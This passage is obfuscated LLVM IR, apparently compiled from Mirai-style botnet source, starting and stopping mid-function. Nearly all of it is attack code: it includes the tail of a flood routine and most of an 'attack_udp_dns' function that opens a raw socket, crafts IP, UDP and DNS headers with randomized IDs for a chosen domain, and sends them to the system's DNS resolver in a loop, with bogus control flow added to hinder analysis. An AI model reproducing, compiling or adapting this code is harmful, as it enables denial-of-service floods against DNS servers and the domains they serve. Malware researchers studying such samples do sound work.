  %394 = bitcast %union.__CONST_SOCKADDR_ARG* %29 to %struct.sockaddr**
  %395 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %396 = load i32, i32* %11, align 4
  %397 = sext i32 %396 to i64
  %398 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %395, i64 %397
  %399 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %398, i32 0, i32 0
  %400 = bitcast %struct.sockaddr_in* %399 to %struct.sockaddr*
  store %struct.sockaddr* %400, %struct.sockaddr** %394, align 8
  %401 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %29, i32 0, i32 0
  %402 = load %struct.sockaddr*, %struct.sockaddr** %401, align 8
  %403 = call i64 @sendto(i32 %389, i8* %390, i64 %393, i32 16384, %struct.sockaddr* %402, i32 16)
  br label %404

; <label>:404:                                    ; preds = %357
  %405 = load i32, i32* %11, align 4
  %406 = add nsw i32 %405, 1
  store i32 %406, i32* %11, align 4
  br label %253

; <label>:407:                                    ; preds = %253
  %408 = call i64 @time(i64* null) #6
  %409 = load i32, i32* %22, align 4
  %410 = sext i32 %409 to i64
  %411 = icmp sgt i64 %408, %410
  br i1 %411, label %412, label %413

; <label>:412:                                    ; preds = %407
  br label %414

; <label>:413:                                    ; preds = %407
  br label %236

; <label>:414:                                    ; preds = %412, %originalBBpart24, %originalBBpart2
  %415 = load i32, i32* @x.27
  %416 = load i32, i32* @y.28
  %417 = sub i32 %415, 1
  %418 = mul i32 %415, %417
  %419 = urem i32 %418, 2
  %420 = icmp eq i32 %419, 0
  %421 = icmp slt i32 %416, 10
  %422 = or i1 %420, %421
  br i1 %422, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %414
  %423 = load i32, i32* @x.27
  %424 = load i32, i32* @y.28
  %425 = sub i32 %423, 1
  %426 = mul i32 %423, %425
  %427 = urem i32 %426, 2
  %428 = icmp eq i32 %427, 0
  %429 = icmp slt i32 %424, 10
  %430 = or i1 %428, %429
  br i1 %430, label %originalBBpart242, label %originalBB40alteredBB

originalBBpart242:                                ; preds = %originalBB40
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %66
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %88
  %431 = load i32, i32* %12, align 4
  %432 = call i32 @close(i32 %431)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %160
  %433 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %434 = load %struct.iphdr*, %struct.iphdr** %23, align 8
  %435 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %434, i32 0, i32 4
  store i16 %433, i16* %435, align 2
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %219
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %236
  store i32 0, i32* %11, align 4
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %277
  %436 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %437 = load i32, i32* %11, align 4
  %438 = sext i32 %437 to i64
  %439 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %436, i64 %438
  %440 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %439, i32 0, i32 1
  %441 = load i32, i32* %440, align 4
  %442 = call i32 @ntohl(i32 %441) #7
  %443 = call i32 @rand_next()
  %444 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %445 = load i32, i32* %11, align 4
  %446 = sext i32 %445 to i64
  %447 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %444, i64 %446
  %448 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %447, i32 0, i32 2
  %449 = load i8, i8* %448, align 4
  %450 = zext i8 %449 to i32
  %_ = sub i32 0, %443
  %gen = add i32 %_, %450
  %_19 = sub i32 0, %443
  %gen20 = add i32 %_19, %450
  %451 = lshr i32 %443, %450
  %_21 = sub i32 %442, %451
  %gen22 = mul i32 %_21, %451
  %_23 = sub i32 %442, %451
  %gen24 = mul i32 %_23, %451
  %_25 = sub i32 %442, %451
  %gen26 = mul i32 %_25, %451
  %_27 = sub i32 %442, %451
  %gen28 = mul i32 %_27, %451
  %_29 = sub i32 %442, %451
  %gen30 = mul i32 %_29, %451
  %_31 = shl i32 %442, %451
  %_32 = shl i32 %442, %451
  %452 = add i32 %442, %451
  %453 = call i32 @htonl(i32 %452) #7
  %454 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %455 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %454, i32 0, i32 9
  store i32 %453, i32* %455, align 4
  br label %originalBB18

originalBB36alteredBB:                            ; preds = %originalBB36, %314
  %456 = load i16, i16* %15, align 2
  %457 = zext i16 %456 to i32
  %458 = icmp eq i32 %457, 65535
  br label %originalBB36

originalBB40alteredBB:                            ; preds = %originalBB40, %414
  br label %originalBB40
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = load i32, i32* @x.29
  %7 = load i32, i32* @y.30
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca i32, align 4
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_target*, align 8
  %17 = alloca i8, align 1
  %18 = alloca %struct.attack_option*, align 8
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i8**, align 8
  %22 = alloca i8, align 1
  %23 = alloca i16, align 2
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca i16, align 2
  %27 = alloca i16, align 2
  %28 = alloca i16, align 2
  %29 = alloca i8, align 1
  %30 = alloca i8*, align 8
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i32, align 4
  %34 = alloca i32, align 4
  %35 = alloca i8, align 1
  %36 = alloca i8, align 1
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.udphdr*, align 8
  %39 = alloca %struct.dnshdr*, align 8
  %40 = alloca i8*, align 8
  %41 = alloca i8*, align 8
  %42 = alloca %struct.grehdr*, align 8
  %43 = alloca i8*, align 8
  %44 = alloca %struct.iphdr*, align 8
  %45 = alloca %struct.udphdr*, align 8
  %46 = alloca %struct.dnshdr*, align 8
  %47 = alloca i8*, align 8
  %48 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %14, align 4
  store i8 %1, i8* %15, align 1
  store %struct.attack_target* %2, %struct.attack_target** %16, align 8
  store i8 %3, i8* %17, align 1
  store %struct.attack_option* %4, %struct.attack_option** %18, align 8
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %49 = load i8, i8* %15, align 1
  %50 = zext i8 %49 to i64
  %51 = call noalias i8* @calloc(i64 %50, i64 8) #6
  %52 = bitcast i8* %51 to i8**
  store i8** %52, i8*** %21, align 8
  %53 = load i8, i8* %17, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 2, i32 0)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %22, align 1
  %57 = load i8, i8* %17, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 3, i32 65535)
  %60 = trunc i32 %59 to i16
  store i16 %60, i16* %23, align 2
  %61 = load i8, i8* %17, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 4, i32 64)
  %64 = trunc i32 %63 to i8
  store i8 %64, i8* %24, align 1
  %65 = load i8, i8* %17, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 5, i32 0)
  %68 = trunc i32 %67 to i8
  store i8 %68, i8* %25, align 1
  %69 = load i8, i8* %17, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 6, i32 65535)
  %72 = trunc i32 %71 to i16
  store i16 %72, i16* %26, align 2
  %73 = load i8, i8* %17, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %75 = call i32 @attack_get_opt_int(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 7, i32 53)
  %76 = trunc i32 %75 to i16
  store i16 %76, i16* %27, align 2
  %77 = load i8, i8* %17, align 1
  %78 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %79 = call i32 @attack_get_opt_int(i8 zeroext %77, %struct.attack_option* %78, i8 zeroext 9, i32 65535)
  %80 = trunc i32 %79 to i16
  store i16 %80, i16* %28, align 2
  %81 = load i8, i8* %17, align 1
  %82 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %83 = call i32 @attack_get_opt_int(i8 zeroext %81, %struct.attack_option* %82, i8 zeroext 0, i32 12)
  %84 = trunc i32 %83 to i8
  store i8 %84, i8* %29, align 1
  %85 = load i8, i8* %17, align 1
  %86 = load %struct.attack_option*, %struct.attack_option** %18, align 8
  %87 = call i8* @attack_get_opt_str(i8 zeroext %85, %struct.attack_option* %86, i8 zeroext 8, i8* null)
  store i8* %87, i8** %30, align 8
  store i32 0, i32* %31, align 4
  %88 = call i32 @get_dns_resolver()
  store i32 %88, i32* %32, align 4
  %89 = call i64 @time(i64* null) #6
  %90 = load i32, i32* %14, align 4
  %91 = sext i32 %90 to i64
  %92 = add nsw i64 %89, %91
  %93 = trunc i64 %92 to i32
  store i32 %93, i32* %33, align 4
  %94 = load i8*, i8** %30, align 8
  %95 = icmp eq i8* %94, null
  %96 = load i32, i32* @x.29
  %97 = load i32, i32* @y.30
  %98 = sub i32 %96, 1
  %99 = mul i32 %96, %98
  %100 = urem i32 %99, 2
  %101 = icmp eq i32 %100, 0
  %102 = icmp slt i32 %97, 10
  %103 = or i1 %101, %102
  br i1 %103, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %95, label %104, label %121

; <label>:104:                                    ; preds = %originalBBpart2
  %105 = load i32, i32* @x.29
  %106 = load i32, i32* @y.30
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %104
  %113 = load i32, i32* @x.29
  %114 = load i32, i32* @y.30
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %606

; <label>:121:                                    ; preds = %originalBBpart2
  %122 = load i32, i32* @x.29
  %123 = load i32, i32* @y.30
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %121
  %130 = load i8*, i8** %30, align 8
  %131 = call i32 @util_strlen(i8* %130)
  store i32 %131, i32* %31, align 4
  %132 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %132, i32* %20, align 4
  %133 = icmp eq i32 %132, -1
  %134 = load i32, i32* @x.29
  %135 = load i32, i32* @y.30
  %136 = sub i32 %134, 1
  %137 = mul i32 %134, %136
  %138 = urem i32 %137, 2
  %139 = icmp eq i32 %138, 0
  %140 = icmp slt i32 %135, 10
  %141 = or i1 %139, %140
  br i1 %141, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %133, label %142, label %143

; <label>:142:                                    ; preds = %originalBBpart212
  br label %606

; <label>:143:                                    ; preds = %originalBBpart212
  store i32 1, i32* %19, align 4
  %144 = load i32, i32* %20, align 4
  %145 = bitcast i32* %19 to i8*
  %146 = call i32 @setsockopt(i32 %144, i32 0, i32 3, i8* %145, i32 4) #6
  %147 = icmp eq i32 %146, -1
  br i1 %147, label %148, label %151

; <label>:148:                                    ; preds = %143
  %149 = load i32, i32* %20, align 4
  %150 = call i32 @close(i32 %149)
  br label %606

; <label>:151:                                    ; preds = %143
  store i32 0, i32* %19, align 4
  br label %152

; <label>:152:                                    ; preds = %393, %151
  %153 = load i32, i32* %19, align 4
  %154 = load i8, i8* %15, align 1
  %155 = zext i8 %154 to i32
  %156 = icmp slt i32 %153, %155
  br i1 %156, label %157, label %396

; <label>:157:                                    ; preds = %152
  %158 = load i32, i32* @x.29
  %159 = load i32, i32* @y.30
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %157
  store i32 0, i32* %34, align 4
  store i8 0, i8* %35, align 1
  store i8 0, i8* %36, align 1
  %166 = call noalias i8* @calloc(i64 600, i64 1) #6
  %167 = load i8**, i8*** %21, align 8
  %168 = load i32, i32* %19, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds i8*, i8** %167, i64 %169
  store i8* %166, i8** %170, align 8
  %171 = load i8**, i8*** %21, align 8
  %172 = load i32, i32* %19, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds i8*, i8** %171, i64 %173
  %175 = load i8*, i8** %174, align 8
  %176 = bitcast i8* %175 to %struct.iphdr*
  store %struct.iphdr* %176, %struct.iphdr** %37, align 8
  %177 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i64 1
  %179 = bitcast %struct.iphdr* %178 to %struct.udphdr*
  store %struct.udphdr* %179, %struct.udphdr** %38, align 8
  %180 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %181 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %180, i64 1
  %182 = bitcast %struct.udphdr* %181 to %struct.dnshdr*
  store %struct.dnshdr* %182, %struct.dnshdr** %39, align 8
  %183 = load %struct.dnshdr*, %struct.dnshdr** %39, align 8
  %184 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %183, i64 1
  %185 = bitcast %struct.dnshdr* %184 to i8*
  store i8* %185, i8** %40, align 8
  %186 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %187 = bitcast %struct.iphdr* %186 to i8*
  %188 = load i8, i8* %187, align 4
  %189 = and i8 %188, 15
  %190 = or i8 %189, 64
  store i8 %190, i8* %187, align 4
  %191 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %192 = bitcast %struct.iphdr* %191 to i8*
  %193 = load i8, i8* %192, align 4
  %194 = and i8 %193, -16
  %195 = or i8 %194, 5
  store i8 %195, i8* %192, align 4
  %196 = load i8, i8* %22, align 1
  %197 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %198 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %197, i32 0, i32 1
  store i8 %196, i8* %198, align 1
  %199 = load i8, i8* %29, align 1
  %200 = zext i8 %199 to i64
  %201 = add i64 41, %200
  %202 = add i64 %201, 2
  %203 = load i32, i32* %31, align 4
  %204 = sext i32 %203 to i64
  %205 = add i64 %202, %204
  %206 = add i64 %205, 4
  %207 = trunc i64 %206 to i16
  %208 = call zeroext i16 @htons(i16 zeroext %207) #7
  %209 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i32 0, i32 2
  store i16 %208, i16* %210, align 2
  %211 = load i16, i16* %23, align 2
  %212 = call zeroext i16 @htons(i16 zeroext %211) #7
  %213 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %214 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %213, i32 0, i32 3
  store i16 %212, i16* %214, align 4
  %215 = load i8, i8* %24, align 1
  %216 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %217 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %216, i32 0, i32 5
  store i8 %215, i8* %217, align 4
  %218 = load i8, i8* %25, align 1
  %219 = icmp ne i8 %218, 0
  %220 = load i32, i32* @x.29
  %221 = load i32, i32* @y.30
  %222 = sub i32 %220, 1
  %223 = mul i32 %220, %222
  %224 = urem i32 %223, 2
  %225 = icmp eq i32 %224, 0
  %226 = icmp slt i32 %221, 10
  %227 = or i1 %225, %226
  br i1 %227, label %originalBBpart276, label %originalBB14alteredBB

originalBBpart276:                                ; preds = %originalBB14
  br i1 %219, label %228, label %232

; <label>:228:                                    ; preds = %originalBBpart276
  %229 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %230 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %231 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %230, i32 0, i32 4
  store i16 %229, i16* %231, align 2
  br label %232

; <label>:232:                                    ; preds = %228, %originalBBpart276
  %233 = load i32, i32* @x.29
  %234 = load i32, i32* @y.30
  %235 = sub i32 %233, 1
  %236 = mul i32 %233, %235
  %237 = urem i32 %236, 2
  %238 = icmp eq i32 %237, 0
  %239 = icmp slt i32 %234, 10
  %240 = or i1 %238, %239
  br i1 %240, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %232
  %241 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %242 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %241, i32 0, i32 6
  store i8 17, i8* %242, align 1
  %243 = load i32, i32* @LOCAL_ADDR, align 4
  %244 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %245 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %244, i32 0, i32 8
  store i32 %243, i32* %245, align 4
  %246 = load i32, i32* %32, align 4
  %247 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %248 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %247, i32 0, i32 9
  store i32 %246, i32* %248, align 4
  %249 = load i16, i16* %26, align 2
  %250 = call zeroext i16 @htons(i16 zeroext %249) #7
  %251 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %252 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %251, i32 0, i32 0
  store i16 %250, i16* %252, align 2
  %253 = load i16, i16* %27, align 2
  %254 = call zeroext i16 @htons(i16 zeroext %253) #7
  %255 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %256 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %255, i32 0, i32 1
  store i16 %254, i16* %256, align 2
  %257 = load i8, i8* %29, align 1
  %258 = zext i8 %257 to i64
  %259 = add i64 21, %258
  %260 = add i64 %259, 2
  %261 = load i32, i32* %31, align 4
  %262 = sext i32 %261 to i64
  %263 = add i64 %260, %262
  %264 = add i64 %263, 4
  %265 = trunc i64 %264 to i16
  %266 = call zeroext i16 @htons(i16 zeroext %265) #7
  %267 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %268 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %267, i32 0, i32 2
  store i16 %266, i16* %268, align 2
  %269 = load i16, i16* %28, align 2
  %270 = call zeroext i16 @htons(i16 zeroext %269) #7
  %271 = load %struct.dnshdr*, %struct.dnshdr** %39, align 8
  %272 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %271, i32 0, i32 0
  store i16 %270, i16* %272, align 2
  %273 = call zeroext i16 @htons(i16 zeroext 256) #7
  %274 = load %struct.dnshdr*, %struct.dnshdr** %39, align 8
  %275 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %274, i32 0, i32 1
  store i16 %273, i16* %275, align 2
  %276 = call zeroext i16 @htons(i16 zeroext 1) #7
  %277 = load %struct.dnshdr*, %struct.dnshdr** %39, align 8
  %278 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %277, i32 0, i32 2
  store i16 %276, i16* %278, align 2
  %279 = load i8, i8* %29, align 1
  %280 = load i8*, i8** %40, align 8
  %281 = getelementptr inbounds i8, i8* %280, i32 1
  store i8* %281, i8** %40, align 8
  store i8 %279, i8* %280, align 1
  %282 = load i8, i8* %29, align 1
  %283 = zext i8 %282 to i32
  %284 = load i8*, i8** %40, align 8
  %285 = sext i32 %283 to i64
  %286 = getelementptr inbounds i8, i8* %284, i64 %285
  store i8* %286, i8** %40, align 8
  %287 = load i8*, i8** %40, align 8
  store i8* %287, i8** %41, align 8
  %288 = load i8*, i8** %40, align 8
  %289 = getelementptr inbounds i8, i8* %288, i64 1
  %290 = load i8*, i8** %30, align 8
  %291 = load i32, i32* %31, align 4
  %292 = add nsw i32 %291, 1
  call void @util_memcpy(i8* %289, i8* %290, i32 %292)
  store i32 0, i32* %34, align 4
  %293 = load i32, i32* @x.29
  %294 = load i32, i32* @y.30
  %295 = sub i32 %293, 1
  %296 = mul i32 %293, %295
  %297 = urem i32 %296, 2
  %298 = icmp eq i32 %297, 0
  %299 = icmp slt i32 %294, 10
  %300 = or i1 %298, %299
  br i1 %300, label %originalBBpart2106, label %originalBB78alteredBB

originalBBpart2106:                               ; preds = %originalBB78
  br label %301

; <label>:301:                                    ; preds = %375, %originalBBpart2106
  %302 = load i32, i32* %34, align 4
  %303 = load i32, i32* %31, align 4
  %304 = icmp slt i32 %302, %303
  br i1 %304, label %305, label %378

; <label>:305:                                    ; preds = %301
  %306 = load i32, i32* @x.29
  %307 = load i32, i32* @y.30
  %308 = sub i32 %306, 1
  %309 = mul i32 %306, %308
  %310 = urem i32 %309, 2
  %311 = icmp eq i32 %310, 0
  %312 = icmp slt i32 %307, 10
  %313 = or i1 %311, %312
  br i1 %313, label %originalBB108, label %originalBB108alteredBB

originalBB108:                                    ; preds = %originalBB108alteredBB, %305
  %314 = load i8*, i8** %30, align 8
  %315 = load i32, i32* %34, align 4
  %316 = sext i32 %315 to i64
  %317 = getelementptr inbounds i8, i8* %314, i64 %316
  %318 = load i8, i8* %317, align 1
  %319 = sext i8 %318 to i32
  %320 = icmp eq i32 %319, 46
  %321 = load i32, i32* @x.29
  %322 = load i32, i32* @y.30
  %323 = sub i32 %321, 1
  %324 = mul i32 %321, %323
  %325 = urem i32 %324, 2
  %326 = icmp eq i32 %325, 0
  %327 = icmp slt i32 %322, 10
  %328 = or i1 %326, %327
  br i1 %328, label %originalBBpart2110, label %originalBB108alteredBB

originalBBpart2110:                               ; preds = %originalBB108
  br i1 %320, label %329, label %355

; <label>:329:                                    ; preds = %originalBBpart2110
  %330 = load i32, i32* @x.29
  %331 = load i32, i32* @y.30
  %332 = sub i32 %330, 1
  %333 = mul i32 %330, %332
  %334 = urem i32 %333, 2
  %335 = icmp eq i32 %334, 0
  %336 = icmp slt i32 %331, 10
  %337 = or i1 %335, %336
  br i1 %337, label %originalBB112, label %originalBB112alteredBB

originalBB112:                                    ; preds = %originalBB112alteredBB, %329
  %338 = load i8, i8* %35, align 1
  %339 = load i8*, i8** %41, align 8
  store i8 %338, i8* %339, align 1
  store i8 0, i8* %35, align 1
  %340 = load i8, i8* %36, align 1
  %341 = add i8 %340, 1
  store i8 %341, i8* %36, align 1
  %342 = load i8*, i8** %40, align 8
  %343 = load i32, i32* %34, align 4
  %344 = sext i32 %343 to i64
  %345 = getelementptr inbounds i8, i8* %342, i64 %344
  %346 = getelementptr inbounds i8, i8* %345, i64 1
  store i8* %346, i8** %41, align 8
  %347 = load i32, i32* @x.29
  %348 = load i32, i32* @y.30
  %349 = sub i32 %347, 1
  %350 = mul i32 %347, %349
  %351 = urem i32 %350, 2
  %352 = icmp eq i32 %351, 0
  %353 = icmp slt i32 %348, 10
  %354 = or i1 %352, %353
  br i1 %354, label %originalBBpart2120, label %originalBB112alteredBB

originalBBpart2120:                               ; preds = %originalBB112
  br label %358

; <label>:355:                                    ; preds = %originalBBpart2110
  %356 = load i8, i8* %35, align 1
  %357 = add i8 %356, 1
  store i8 %357, i8* %35, align 1
  br label %358

; <label>:358:                                    ; preds = %355, %originalBBpart2120
  %359 = load i32, i32* @x.29
  %360 = load i32, i32* @y.30
  %361 = sub i32 %359, 1
  %362 = mul i32 %359, %361
  %363 = urem i32 %362, 2
  %364 = icmp eq i32 %363, 0
  %365 = icmp slt i32 %360, 10
  %366 = or i1 %364, %365
  br i1 %366, label %originalBB122, label %originalBB122alteredBB

originalBB122:                                    ; preds = %originalBB122alteredBB, %358
  %367 = load i32, i32* @x.29
  %368 = load i32, i32* @y.30
  %369 = sub i32 %367, 1
  %370 = mul i32 %367, %369
  %371 = urem i32 %370, 2
  %372 = icmp eq i32 %371, 0
  %373 = icmp slt i32 %368, 10
  %374 = or i1 %372, %373
  br i1 %374, label %originalBBpart2124, label %originalBB122alteredBB

originalBBpart2124:                               ; preds = %originalBB122
  br label %375

; <label>:375:                                    ; preds = %originalBBpart2124
  %376 = load i32, i32* %34, align 4
  %377 = add nsw i32 %376, 1
  store i32 %377, i32* %34, align 4
  br label %301

; <label>:378:                                    ; preds = %301
  %379 = load i8, i8* %35, align 1
  %380 = load i8*, i8** %41, align 8
  store i8 %379, i8* %380, align 1
  %381 = load i8*, i8** %40, align 8
  %382 = load i32, i32* %31, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds i8, i8* %381, i64 %383
  %385 = getelementptr inbounds i8, i8* %384, i64 2
  %386 = bitcast i8* %385 to %struct.grehdr*
  store %struct.grehdr* %386, %struct.grehdr** %42, align 8
  %387 = call zeroext i16 @htons(i16 zeroext 1) #7
  %388 = load %struct.grehdr*, %struct.grehdr** %42, align 8
  %389 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %388, i32 0, i32 0
  store i16 %387, i16* %389, align 2
  %390 = call zeroext i16 @htons(i16 zeroext 1) #7
  %391 = load %struct.grehdr*, %struct.grehdr** %42, align 8
  %392 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %391, i32 0, i32 1
  store i16 %390, i16* %392, align 2
  br label %393

; <label>:393:                                    ; preds = %378
  %394 = load i32, i32* %19, align 4
  %395 = add nsw i32 %394, 1
  store i32 %395, i32* %19, align 4
  br label %152

; <label>:396:                                    ; preds = %152
  br label %397

; <label>:397:                                    ; preds = %originalBBpart2144, %396
  store i32 0, i32* %19, align 4
  br label %398

; <label>:398:                                    ; preds = %548, %397
  %399 = load i32, i32* %19, align 4
  %400 = load i8, i8* %15, align 1
  %401 = zext i8 %400 to i32
  %402 = icmp slt i32 %399, %401
  br i1 %402, label %403, label %551

; <label>:403:                                    ; preds = %398
  %404 = load i8**, i8*** %21, align 8
  %405 = load i32, i32* %19, align 4
  %406 = sext i32 %405 to i64
  %407 = getelementptr inbounds i8*, i8** %404, i64 %406
  %408 = load i8*, i8** %407, align 8
  store i8* %408, i8** %43, align 8
  %409 = load i8*, i8** %43, align 8
  %410 = bitcast i8* %409 to %struct.iphdr*
  store %struct.iphdr* %410, %struct.iphdr** %44, align 8
  %411 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %412 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %411, i64 1
  %413 = bitcast %struct.iphdr* %412 to %struct.udphdr*
  store %struct.udphdr* %413, %struct.udphdr** %45, align 8
  %414 = load %struct.udphdr*, %struct.udphdr** %45, align 8
  %415 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %414, i64 1
  %416 = bitcast %struct.udphdr* %415 to %struct.dnshdr*
  store %struct.dnshdr* %416, %struct.dnshdr** %46, align 8
  %417 = load %struct.dnshdr*, %struct.dnshdr** %46, align 8
  %418 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %417, i64 1
  %419 = bitcast %struct.dnshdr* %418 to i8*
  %420 = getelementptr inbounds i8, i8* %419, i64 1
  store i8* %420, i8** %47, align 8
  %421 = load i16, i16* %23, align 2
  %422 = zext i16 %421 to i32
  %423 = icmp eq i32 %422, 65535
  br i1 %423, label %424, label %446

; <label>:424:                                    ; preds = %403
  %425 = load i32, i32* @x.29
  %426 = load i32, i32* @y.30
  %427 = sub i32 %425, 1
  %428 = mul i32 %425, %427
  %429 = urem i32 %428, 2
  %430 = icmp eq i32 %429, 0
  %431 = icmp slt i32 %426, 10
  %432 = or i1 %430, %431
  br i1 %432, label %originalBB126, label %originalBB126alteredBB

originalBB126:                                    ; preds = %originalBB126alteredBB, %424
  %433 = call i32 @rand_next()
  %434 = and i32 %433, 65535
  %435 = trunc i32 %434 to i16
  %436 = load %struct.iphdr*, %struct.iphdr** %44, align 8
  %437 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %436, i32 0, i32 3
  store i16 %435, i16* %437, align 4
  %438 = load i32, i32* @x.29
  %439 = load i32, i32* @y.30
  %440 = sub i32 %438, 1
  %441 = mul i32 %438, %440
  %442 = urem i32 %441, 2
  %443 = icmp eq i32 %442, 0
  %444 = icmp slt i32 %439, 10
  %445 = or i1 %443, %444
  br i1 %445, label %originalBBpart2132, label %originalBB126alteredBB

originalBBpart2132:                               ; preds = %originalBB126
  br label %446

; <label>:446:                                    ; preds = %originalBBpart2132, %403
